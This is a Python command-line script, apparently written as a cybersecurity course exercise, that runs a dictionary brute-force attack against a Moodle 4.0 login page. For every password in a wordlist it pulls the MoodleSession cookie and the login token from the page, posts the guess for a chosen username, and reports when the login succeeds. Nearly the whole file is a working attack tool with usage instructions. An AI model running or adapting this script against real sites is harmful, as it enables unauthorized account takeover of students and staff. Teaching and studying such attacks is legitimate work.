"""
************************************************************************************
*    -- Realizado por Curso de Ciberseguridad Fundacion Secretariado Gitano -- 
*    -------------------------------------------------------------------------
*    Autores: Jesus Perez Montaño.
*             Adolfo Miguel Montoya Caldera.
*             Ana Belen Cuetara Gutierrez.
*             Isabel Maria Gomez Palomeque.
*             Arturo Jimenez Borja.
*             Bernabe Reyes Cortes.
*             Emilio Salazar Montiel.
*             Manuel Jimenez Maya.
*             Antonio Moreno Amaya.
*             Basilia Moreno Muñoz.
*
************************************************************************************
"""
import requests,argparse

# Recibir Argumentos:
description = """



Ejemplos de uso:
-u https://xxxx.com -l usuario -d diccionario.txt ...     

Requiere instalacion del módulo requests:

pip install requests

"""

parser=argparse.ArgumentParser(description='Ataque por diccionario a Moodle 4.0 - Realizado por el curso de ciberseguridad de Fundacion Secretariado Gitano.', epilog=description)
parser.add_argument("-u", dest="Url", help="Introduzca la direccion del Objetivo: https://xxx.com", required=True)
parser.add_argument("-l", dest="Usuario", help="Introduzca el nombre de usuario.", required=True)
parser.add_argument("-d", dest="Dic", help="Introduzca el diccionario de password.", required=True)

params=parser.parse_args()
Url=params.Url
Usuario=params.Usuario
Dic=params.Dic


Url=Url + "/login/index.php"

print ("\n")
print ("\n")
print ("\n")

print ("Version: 1.0")
print ("Url Objetivo:",Url)
print ("Usuario:", Usuario)
print ("Diccionario de Password:", Dic)

print ("\n")
print ("\n")




# Abrir diccionario de ataque.
# ----------------------------
if Url != "" and Usuario != "" and Dic != "":
       
    for linea in open(Dic,'r'):

        try:
            
            # 1 Paso, leer con GET. Hacerse con el tokenlogin.

            Response=requests.get(Url)

            if Response.status_code==200:
                # Leer encabezados para sacar la id de session.
                Encabezado= Response.headers

                Cokie=Encabezado['Set-Cookie']

                P1=Cokie.find("=")
                P2=Cokie.find(";")

                MoodleSession="MoodleSession=" + Cokie[P1+1:P2]
        

                # Leer body para sacar token.
                Aux=str(Response.content)

                P1=Aux.find("logintoken")
                P2=Aux.find('"',P1+11)
       
                Aux=Aux[P1+19:]

                P1=Aux.find('"')

                LoginToken=Aux[:P1]

                # 2 Paso 

                print (MoodleSession, "\n" + "LoginToken:" + LoginToken + "\n" + "Password:" + linea)


                Cabecera={"Content-Type":"application/x-www-form-urlencoded",'Cookie':MoodleSession}

                Datos={"logintoken":LoginToken, 'anchor':'','username':str(Usuario.strip()),'password':str(linea.strip())}

                Response=requests.post(Url, headers=Cabecera, data=Datos)

                print ("Estado:" + str(Response.status_code),end="\n\n")

                if Response.status_code==200:

                    Cabecera={"Content-Type":"application/x-www-form-urlencoded",'Cookie':MoodleSession}

                    Response=requests.get(Url, headers=Cabecera)
        
                    Resultado=Response.content
        
                    if str(Resultado).find("Acceso inv")!=-1:
                        print ("Clave Incorrecta")
                    else:
                        print ("Clave Correcta!!!")
                        break
        except:
            print ("Error en conexion....")
        
            
    
    

       


